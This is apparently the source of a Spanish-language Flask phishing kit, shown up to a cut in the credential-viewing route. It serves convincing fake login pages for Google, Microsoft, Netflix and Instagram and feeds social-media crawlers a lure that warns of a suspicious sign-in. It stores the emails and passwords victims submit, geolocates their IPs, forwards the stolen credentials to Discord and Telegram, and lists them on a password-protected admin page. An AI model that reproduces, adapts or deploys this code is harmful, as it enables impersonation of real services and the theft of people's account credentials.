#!/usr/bin/env python3
import os
import sqlite3
import json
import requests
import hashlib
import re
import logging
from datetime import datetime, timedelta
from flask import Flask, request, render_template_string, redirect, jsonify, abort, session

# Configurar logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Configuración de seguridad de sesión
app.secret_key = os.environ.get('SECRET_KEY', 'clave-secreta-para-session-12345')
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=timedelta(hours=2)
)

# =============================================
# CONFIGURACIÓN CORREGIDA - LEE VARIABLE DE ENTORNO
# =============================================
CONFIG = {
    'discord_webhook': None,
    'telegram_token': None,
    'telegram_chat': None,
    'redirect_url': 'https://www.google.com',
    'template': 'google',
    'api_key': os.environ.get('API_KEY', 'cambia-esta-clave'),  # <--- LEE VARIABLE DE ENTORNO
    'admin_password': 'triple777',
    'max_login_attempts': 5,
    'cleanup_days': 30
}

login_attempts = {}
view_requests = {}
root_requests = {}
audit_log_enabled = True

def audit_log(action, details, ip=None):
    if not audit_log_enabled:
        return
    if ip is None:
        ip = get_client_ip()
    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'action': action,
        'ip': ip,
        'details': details,
        'authenticated': session.get('admin_logged', False)
    }
    try:
        with open('audit.log', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
    except Exception as e:
        logger.error(f"Error en audit log: {e}")

def is_rate_limited(ip, storage, limit=10, window_seconds=60):
    now = datetime.now()
    if ip in storage:
        count, timestamp = storage[ip]
        if (now - timestamp).total_seconds() < window_seconds:
            if count >= limit:
                return True
            storage[ip] = (count + 1, timestamp)
        else:
            storage[ip] = (1, now)
    else:
        storage[ip] = (1, now)
    return False

def is_ip_blocked(ip):
    if ip in login_attempts:
        attempts, block_time = login_attempts[ip]
        if attempts >= CONFIG.get('max_login_attempts', 5):
            if datetime.now() - block_time < timedelta(minutes=5):
                return True
            else:
                del login_attempts[ip]
    return False

def load_config():
    try:
        with open('config.json', 'r') as f:
            CONFIG.update(json.load(f))
            logger.info("Configuración cargada desde config.json")
    except FileNotFoundError:
        logger.warning("config.json no encontrado, usando configuración por defecto")
    except Exception as e:
        logger.error(f"Error al cargar config.json: {e}")
    
    # =============================================
    # PRIORIDAD: VARIABLE DE ENTORNO SOBREESCRIBE CONFIG
    # =============================================
    if os.environ.get('API_KEY'):
        CONFIG['api_key'] = os.environ.get('API_KEY')
        logger.info(f"API_KEY cargada desde variable de entorno: {CONFIG['api_key'][:4]}...")
    else:
        logger.warning("API_KEY no encontrada en variables de entorno, usando valor por defecto")

def init_db():
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                ip TEXT,
                username TEXT,
                password TEXT,
                user_agent TEXT,
                referer TEXT,
                geo_location TEXT,
                hash TEXT UNIQUE,
                viewed INTEGER DEFAULT 0
            )
        ''')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_timestamp ON credentials(timestamp)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_ip ON credentials(ip)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_username ON credentials(username)')
        conn.commit()
        conn.close()
        logger.info("Base de datos inicializada correctamente")
    except Exception as e:
        logger.error(f"Error al inicializar la base de datos: {e}")

def cleanup_old_credentials(days=None):
    if days is None:
        days = CONFIG.get('cleanup_days', 30)
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            DELETE FROM credentials 
            WHERE datetime(timestamp) < datetime('now', ?)
        ''', (f'-{days} days',))
        deleted = cursor.rowcount
        conn.commit()
        conn.close()
        if deleted > 0:
            logger.info(f"Eliminadas {deleted} credenciales antiguas (más de {days} días)")
        return deleted
    except Exception as e:
        logger.error(f"Error en cleanup de credenciales: {e}")
        return 0

def get_client_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in str(ip):
        ip = ip.split(',')[0].strip()
    return ip

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city", timeout=3).json()
        if r.get('status') == 'success':
            return f"{r.get('city', 'Unknown')}, {r.get('country', 'Unknown')}"
    except Exception as e:
        logger.warning(f"Error al obtener geolocalización para {ip}: {e}")
    return "Unknown"

def is_social_crawler(ua):
    social_bots = ['facebookexternalhit', 'twitterbot', 'whatsapp', 'linkedinbot', 
                   'telegrambot', 'discord', 'slackbot', 'pinterest', 'redditbot']
    return any(bot in ua.lower() for bot in social_bots)

def validate_input(text):
    if text:
        return re.match(r'^[a-zA-Z0-9@.\-_\s]+$', text) is not None
    return True

def validate_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

def send_notifications(data):
    if CONFIG.get('discord_webhook'):
        try:
            embed = {
                "title": "🎯 Nueva Captura",
                "color": 0x00ff00,
                "fields": [
                    {"name": "📍 IP", "value": data['ip'], "inline": True},
                    {"name": "🌍 Ubicación", "value": data['geo'], "inline": True},
                    {"name": "👤 Usuario", "value": f"```{data['username']}```", "inline": False},
                    {"name": "🔑 Contraseña", "value": f"```{data['password'][:20]}...```", "inline": False},
                ],
                "footer": {"text": f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
            }
            requests.post(CONFIG['discord_webhook'], json={"embeds": [embed]}, timeout=5)
            logger.info("Notificación enviada a Discord")
        except Exception as e:
            logger.error(f"Error al enviar notificación a Discord: {e}")
    
    if CONFIG.get('telegram_token') and CONFIG.get('telegram_chat'):
        try:
            msg = f"🎯 *Nueva Captura*\n\n📍 `{data['ip']}`\n🌍 `{data['geo']}`\n👤 `{data['username']}`\n🔑 `{data['password'][:30]}`"
            url = f"https://api.telegram.org/bot{CONFIG['telegram_token']}/sendMessage"
            requests.post(url, json={"chat_id": CONFIG['telegram_chat'], "text": msg, "parse_mode": "Markdown"}, timeout=5)
            logger.info("Notificación enviada a Telegram")
        except Exception as e:
            logger.error(f"Error al enviar notificación a Telegram: {e}")

@app.after_request
def add_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    if request.path == '/' or request.path == '/capture':
        response.headers['Content-Security-Policy'] = (
            "default-src 'self'; "
            "style-src 'self' 'unsafe-inline'; "
            "script-src 'self' 'unsafe-inline'; "
            "img-src 'self' https://www.google.com https://i.imgur.com https://aadcdn.msftauth.net; "
            "font-src 'self' https://fonts.gstatic.com; "
            "form-action 'self'; "
            "frame-ancestors 'none'"
        )
    return response

@app.before_request
def limit_root_requests():
    if request.path == '/':
        ip = get_client_ip()
        if is_rate_limited(ip, root_requests, limit=20, window_seconds=60):
            logger.warning(f"Rate limit excedido en raíz desde IP {ip}")
            audit_log('ROOT_RATE_LIMIT', {'ip': ip}, ip)
            return "⏳ Demasiadas visitas. Espera 1 minuto.", 429

@app.before_request
def handle_bots():
    ua = request.headers.get('User-Agent', '')
    if is_social_crawler(ua) and request.path == '/':
        return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <meta property="og:url" content="https://nuevo-acceso-a-tu-cuenta.onrender.com/">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <title>Alerta de seguridad</title>
</head>
<body>
    <h1>Alerta de seguridad</h1>
    <p>Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.</p>
</body>
</html>
'''), 200

def get_template(name='google'):
    templates = {
        'google': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Verificación de seguridad</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif}
        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:100%;max-width:440px;text-align:center}
        .logo{width:75px;margin-bottom:20px}
        h1{font-size:24px;font-weight:500;margin-bottom:10px;color:#202124}
        p{color:#5f6368;margin-bottom:25px;font-size:14px}
        .security-badge{background:#e8f0fe;color:#1a73e8;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
        input{width:100%;padding:14px 16px;margin-bottom:14px;border:1px solid #dadce0;border-radius:8px;font-size:16px;transition:all 0.3s}
        input:focus{outline:none;border-color:#1a73e8;box-shadow:0 0 0 3px rgba(26,115,232,0.2)}
        button{width:100%;padding:14px;background:#1a73e8;color:white;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s}
        button:hover{background:#1557b0;transform:translateY(-2px);box-shadow:0 4px 12px rgba(26,115,232,0.3)}
        button:disabled{opacity:0.7;cursor:not-allowed;transform:none}
        .footer{margin-top:25px;font-size:13px;color:#5f6368}
        .loading{display:none;margin:10px 0}
        .spinner{border:3px solid #f3f3f3;border-top:3px solid #1a73e8;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin:0 auto}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .error{color:#d93025;background:#fce8e6;padding:10px;border-radius:8px;margin-bottom:15px;display:none}
        .honeypot{display:none}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
        <div class="security-badge">🔒 Verificación de seguridad</div>
        <h1>Tu sesión ha expirado</h1>
        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
        
        <div id="error" class="error"></div>
        
        <form action="/capture" method="POST" id="loginForm">
            <input type="email" name="email" placeholder="Correo electrónico" required autocomplete="email">
            <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
            
            <div class="honeypot">
                <input type="text" name="honeypot" tabindex="-1" autocomplete="off">
            </div>
            
            <button type="submit" id="submitBtn">Continuar</button>
            <div class="loading" id="loading"><div class="spinner"></div><p style="margin-top:10px;color:#666;font-size:14px;">Verificando...</p></div>
        </form>
        <div class="footer">🔐 Conexión segura</div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const btn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            btn.disabled = true;
            btn.style.display = 'none';
            loading.style.display = 'block';
            
            setTimeout(function() {
                btn.disabled = false;
                btn.style.display = 'block';
                loading.style.display = 'none';
            }, 15000);
        });
    </script>
</body>
</html>''',
        
        'microsoft': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Verificación de seguridad</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:100%;max-width:440px;text-align:center}
        .logo{width:108px;margin-bottom:20px}
        h1{font-size:24px;font-weight:600;margin-bottom:10px;color:#1b1b1b}
        p{color:#5f6368;margin-bottom:25px;font-size:14px}
        .security-badge{background:#e8f0fe;color:#0067b8;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
        input{width:100%;padding:14px 16px;margin-bottom:14px;border:1px solid #ccc;border-radius:8px;font-size:16px;transition:all 0.3s}
        input:focus{outline:none;border-color:#0067b8;box-shadow:0 0 0 3px rgba(0,103,184,0.2)}
        button{width:100%;padding:14px;background:#0067b8;color:white;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s}
        button:hover{background:#005a9e;transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,103,184,0.3)}
        button:disabled{opacity:0.7;cursor:not-allowed;transform:none}
        .footer{margin-top:25px;font-size:13px;color:#5f6368}
        .loading{display:none;margin:10px 0}
        .spinner{border:3px solid #f3f3f3;border-top:3px solid #0067b8;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin:0 auto}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .error{color:#d93025;background:#fce8e6;padding:10px;border-radius:8px;margin-bottom:15px;display:none}
        .honeypot{display:none}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
        <div class="security-badge">🔒 Verificación de seguridad</div>
        <h1>Tu sesión ha expirado</h1>
        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
        
        <div id="error" class="error"></div>
        
        <form action="/capture" method="POST" id="loginForm">
            <input type="email" name="email" placeholder="Correo, teléfono o Skype" required autocomplete="email">
            <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
            
            <div class="honeypot">
                <input type="text" name="honeypot" tabindex="-1" autocomplete="off">
            </div>
            
            <button type="submit" id="submitBtn">Iniciar sesión</button>
            <div class="loading" id="loading"><div class="spinner"></div><p style="margin-top:10px;color:#666;font-size:14px;">Verificando...</p></div>
        </form>
        <div class="footer">🔐 Conexión segura</div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const btn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            btn.disabled = true;
            btn.style.display = 'none';
            loading.style.display = 'block';
            
            setTimeout(function() {
                btn.disabled = false;
                btn.style.display = 'block';
                loading.style.display = 'none';
            }, 15000);
        });
    </script>
</body>
</html>''',
        
        'netflix': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Verificación de seguridad</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',sans-serif}
        body{background:linear-gradient(135deg,#141414 0%, #000000 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:rgba(0,0,0,0.85);backdrop-filter:blur(10px);padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.8);width:100%;max-width:440px;text-align:center}
        h1{color:white;font-size:28px;margin-bottom:10px;font-weight:700}
        p{color:#999;margin-bottom:25px;font-size:14px}
        .security-badge{background:#e50914;color:white;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
        input{width:100%;padding:14px 16px;margin-bottom:14px;background:#333;border:1px solid #555;border-radius:8px;color:white;font-size:16px;transition:all 0.3s}
        input:focus{outline:none;border-color:#e50914;box-shadow:0 0 0 3px rgba(229,9,20,0.2)}
        input::placeholder{color:#888}
        button{width:100%;padding:14px;background:#e50914;color:white;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.3s}
        button:hover{background:#f40612;transform:translateY(-2px);box-shadow:0 4px 12px rgba(229,9,20,0.4)}
        button:disabled{opacity:0.7;cursor:not-allowed;transform:none}
        .footer{margin-top:25px;font-size:13px;color:#666}
        .loading{display:none;margin:10px 0}
        .spinner{border:3px solid #333;border-top:3px solid #e50914;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin:0 auto}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .error{color:#e50914;background:rgba(229,9,20,0.1);padding:10px;border-radius:8px;margin-bottom:15px;display:none}
        .honeypot{display:none}
    </style>
</head>
<body>
    <div class="container">
        <h1 style="font-size:40px;font-family:'Helvetica Neue',sans-serif;margin-bottom:30px;">NETFLIX</h1>
        <div class="security-badge">🔒 Verificación de seguridad</div>
        <h1>Tu sesión ha expirado</h1>
        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
        
        <div id="error" class="error"></div>
        
        <form action="/capture" method="POST" id="loginForm">
            <input type="email" name="email" placeholder="Email" required autocomplete="email">
            <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
            
            <div class="honeypot">
                <input type="text" name="honeypot" tabindex="-1" autocomplete="off">
            </div>
            
            <button type="submit" id="submitBtn">Iniciar sesión</button>
            <div class="loading" id="loading"><div class="spinner"></div><p style="margin-top:10px;color:#666;font-size:14px;">Verificando...</p></div>
        </form>
        <div class="footer">🔐 Conexión segura</div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const btn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            btn.disabled = true;
            btn.style.display = 'none';
            loading.style.display = 'block';
            
            setTimeout(function() {
                btn.disabled = false;
                btn.style.display = 'block';
                loading.style.display = 'none';
            }, 15000);
        });
    </script>
</body>
</html>''',
        
        'instagram': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Verificación de seguridad</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,sans-serif}
        body{background:linear-gradient(135deg,#fafafa 0%, #e0e0e0 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:white;border:1px solid #dbdbdb;padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.1);width:100%;max-width:400px;text-align:center}
        .logo{font-size:44px;font-family:'Brush Script MT',cursive;margin-bottom:20px}
        h1{font-size:24px;font-weight:600;margin-bottom:10px;color:#262626}
        p{color:#8e8e8e;margin-bottom:25px;font-size:14px}
        .security-badge{background:#e8f0fe;color:#0095f6;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
        input{width:100%;padding:14px 16px;margin-bottom:14px;background:#fafafa;border:1px solid #dbdbdb;border-radius:8px;font-size:16px;transition:all 0.3s}
        input:focus{outline:none;border-color:#0095f6;box-shadow:0 0 0 3px rgba(0,149,246,0.2)}
        button{width:100%;padding:14px;background:#0095f6;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s}
        button:hover{background:#0081d6;transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,149,246,0.3)}
        button:disabled{opacity:0.7;cursor:not-allowed;transform:none}
        .footer{margin-top:25px;font-size:13px;color:#8e8e8e}
        .loading{display:none;margin:10px 0}
        .spinner{border:3px solid #f3f3f3;border-top:3px solid #0095f6;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin:0 auto}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .error{color:#d93025;background:#fce8e6;padding:10px;border-radius:8px;margin-bottom:15px;display:none}
        .honeypot{display:none}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <div class="security-badge">🔒 Verificación de seguridad</div>
        <h1>Tu sesión ha expirado</h1>
        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
        
        <div id="error" class="error"></div>
        
        <form action="/capture" method="POST" id="loginForm">
            <input type="text" name="email" placeholder="Teléfono, usuario o correo" required autocomplete="username">
            <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
            
            <div class="honeypot">
                <input type="text" name="honeypot" tabindex="-1" autocomplete="off">
            </div>
            
            <button type="submit" id="submitBtn">Iniciar sesión</button>
            <div class="loading" id="loading"><div class="spinner"></div><p style="margin-top:10px;color:#666;font-size:14px;">Verificando...</p></div>
        </form>
        <div class="footer">🔐 Conexión segura</div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const btn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            btn.disabled = true;
            btn.style.display = 'none';
            loading.style.display = 'block';
            
            setTimeout(function() {
                btn.disabled = false;
                btn.style.display = 'block';
                loading.style.display = 'none';
            }, 15000);
        });
    </script>
</body>
</html>'''
    }
    return templates.get(name, templates['google'])

@app.route('/')
def index():
    return render_template_string(get_template(CONFIG.get('template', 'google')))

@app.route('/capture', methods=['POST'])
def capture():
    ip = get_client_ip()
    
    if request.form.get('honeypot'):
        logger.warning(f"Bot detectado en IP {ip}")
        audit_log('BOT_DETECTED', {'ip': ip}, ip)
        return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
    
    username = request.form.get('email', '') or request.form.get('username', '')
    password = request.form.get('password', '')
    
    if not validate_email(username):
        logger.warning(f"Email inválido desde {ip}: {username}")
        audit_log('INVALID_EMAIL', {'username': username, 'ip': ip}, ip)
        return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
    
    if not password or len(password) < 4:
        logger.warning(f"Contraseña muy corta desde {ip}")
        audit_log('SHORT_PASSWORD', {'ip': ip}, ip)
        return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
    
    geo = get_geo(ip)
    
    if not validate_input(username):
        logger.warning(f"Intento de inyección detectado desde {ip}")
        audit_log('INJECTION_ATTEMPT', {'username': username, 'ip': ip}, ip)
        username = re.sub(r'[^a-zA-Z0-9@.\-_\s]', '', username)
    
    hash_str = hashlib.md5(f"{ip}:{username}:{password}".encode()).hexdigest()
    
    data = {
        'timestamp': datetime.now().isoformat(),
        'ip': ip,
        'username': username,
        'password': password,
        'user_agent': request.headers.get('User-Agent', ''),
        'referer': request.headers.get('Referer', ''),
        'geo': geo,
        'hash': hash_str
    }
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR IGNORE INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location, hash)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (data['timestamp'], data['ip'], data['username'], data['password'],
              data['user_agent'], data['referer'], geo, hash_str))
        conn.commit()
        conn.close()
        logger.info(f"Nueva credencial capturada: {username} desde {ip}")
        audit_log('NEW_CREDENTIAL', {'username': username, 'ip': ip}, ip)
    except Exception as e:
        logger.error(f"Error al guardar credencial: {e}")
    
    send_notifications(data)
    
    return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="2;url=https://www.google.com">
    <title>Verificación exitosa</title>
    <style>
        body { display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; }
        .container { text-align: center; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #202124; font-weight: 400; }
        p { color: #5f6368; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>Verificando tu identidad...</h2>
        <p>Serás redirigido automáticamente.</p>
    </div>
</body>
</html>
''')

@app.route('/login-credenciales', methods=['GET', 'POST'])
def login_credenciales():
    ip = get_client_ip()
    max_attempts = CONFIG.get('max_login_attempts', 5)
    
    if is_ip_blocked(ip):
        audit_log('LOGIN_BLOCKED', {'ip': ip}, ip)
        return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Acceso Bloqueado</title>
            <style>
                body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
                .error { color: red; margin-top: 10px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚫 Acceso Bloqueado</h1>
                <p>Has superado el límite de intentos permitidos.</p>
                <p class="error">Espera 5 minutos para volver a intentarlo.</p>
            </div>
        </body>
        </html>
        ''', 429)
    
    if request.method == 'POST':
        password = request.form.get('password')
        if password == CONFIG.get('admin_password', 'triple777'):
            login_attempts.pop(ip, None)
            session['admin_logged'] = True
            session.permanent = True
            logger.info(f"Login exitoso desde IP {ip}")
            audit_log('LOGIN_SUCCESS', {'ip': ip}, ip)
            return redirect('/ver-credenciales')
        else:
            if ip not in login_attempts:
                login_attempts[ip] = [0, datetime.now()]
            login_attempts[ip][0] += 1
            login_attempts[ip][1] = datetime.now()
            remaining = max_attempts - login_attempts[ip][0]
            logger.warning(f"Login fallido desde IP {ip}, intentos: {login_attempts[ip][0]}")
            audit_log('LOGIN_FAILURE', {'ip': ip, 'attempts': login_attempts[ip][0]}, ip)
            
            return render_template_string('''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Acceso Denegado</title>
                <style>
                    body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
                    .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
                    .error { color: red; margin-top: 10px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🔒 Contraseña incorrecta</h1>
                    <p class="error">Intentos restantes: ''' + str(remaining) + '''</p>
                    <a href="/login-credenciales">Volver</a>
                </div>
            </body>
            </html>
            ''')
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Acceso a Credenciales</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
            body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
            h1 { color: #1a73e8; margin-bottom: 20px; font-size: 24px; }
            .lock { font-size: 48px; margin-bottom: 15px; }
            input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
            input:focus { outline: none; border-color: #1a73e8; }
            button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
            button:hover { background: #1557b0; }
            .footer { margin-top: 20px; color: #666; font-size: 14px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="lock">🔐</div>
            <h1>Acceso a Credenciales</h1>
            <p style="color:#666; margin-bottom:20px;">Introduce la contraseña de administrador</p>
            <form method="POST">
                <input type="password" name="password" placeholder="Contraseña" required autofocus>
                <button type="submit">Acceder</button>
            </form>
            <div class="footer">Acceso restringido</div>
        </div>
    </body>
    </html>
    ''')

@app.route('/ver-credenciales')
def ver_credenciales():
    if not session.get('admin_logged'):
        return redirect('/login-credenciales')
    
    ip = get_client_ip()
    
    if is_rate_limited(ip, view_requests, limit=10, window_seconds=60):
        logger.warning(f"Rate limit excedido desde IP {ip} en /ver-credenciales")
        audit_log('RATE_LIMIT_VIEWS', {'ip': ip}, ip)
        return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Límite alcanzado</title>
            <style>
                body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>⏳ Demasiadas peticiones</h1>
                <p>Espera 1 minuto antes de volver a intentarlo.</p>
            </div>
        </body>
        </html>
        ''', 429)
    
    allowed_params = ['ip', 'username', 'location']
    filters = {}
    
    for param in allowed_params:
        value = request.args.get(param, '').strip()
        if value:
            if len(value) > 50:
                continue
            if re.match(r'^[a-zA-Z0-9@.\-_\s]+$', value):
                filters[param] = value
            else:
                logger.warning(f"Filtro rechazado: {param}={value}")
                audit_log('INVALID_FILTER', {'param': param, 'value': value}, ip)
    
    audit_log('VIEW_CREDENTIALS', {'filters': filters, 'count': len(filters)}, ip)
    
    query = 'SELECT id, timestamp, ip, username, password, geo_location FROM credentials WHERE 1=1'
    params = []
    
    if 'ip' in filters:
        query += ' AND ip LIKE ?'
        params.append(f'%{filters["ip"]}%')
    if 'username' in filters:
        query += ' AND username LIKE ?'
        params.append(f'%{filters["username"]}%')
    if 'location' in filters:
        query += ' AND geo_location LIKE ?'
        params.append(f'%{filters["location"]}%')
    
    query += ' ORDER BY id DESC'
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
